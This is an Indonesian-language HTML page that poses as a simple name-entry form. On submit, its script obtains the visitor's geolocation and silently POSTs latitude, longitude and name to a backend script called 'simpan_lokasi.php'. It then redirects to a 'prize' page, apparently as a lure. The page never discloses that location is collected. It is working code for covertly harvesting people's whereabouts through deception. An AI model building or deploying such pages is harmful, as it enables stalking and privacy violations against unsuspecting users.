<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Form Nama</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen px-4">
  <div class="text-center max-w-md w-full">
    <h1 class="text-2xl font-bold mb-6">Masukkan Nama Anda</h1>
    <input type="text" id="nama" placeholder="Nama lengkap"
      class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 mb-4" />
    <button id="kirimBtn" class="bg-blue-600 text-white w-full py-3 rounded-lg text-lg hover:bg-blue-700 transition">
      Kirim
    </button>
  </div>

  <script>
    document.getElementById('kirimBtn').addEventListener('click', () => {
      const nama = document.getElementById('nama').value.trim();
      if (nama === "") {
        alert("Nama tidak boleh kosong.");
        return;
      }

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;

            // Kirim ke backend
            fetch("simpan_lokasi.php", {
              method: "POST",
              headers: { "Content-Type": "application/x-www-form-urlencoded" },
              body: `lat=${lat}&lon=${lon}&nama=${encodeURIComponent(nama)}`
            });

            // Redirect ke halaman hadiah
            window.location.href = `hadiah.html?nama=${encodeURIComponent(nama)}`;
          },
          (err) => {
            alert("Gagal mendapatkan lokasi.");
            console.error(err);
          }
        );
      } else {
        alert("Browser tidak mendukung geolokasi.");
      }
    });
  </script>
</body>
</html>
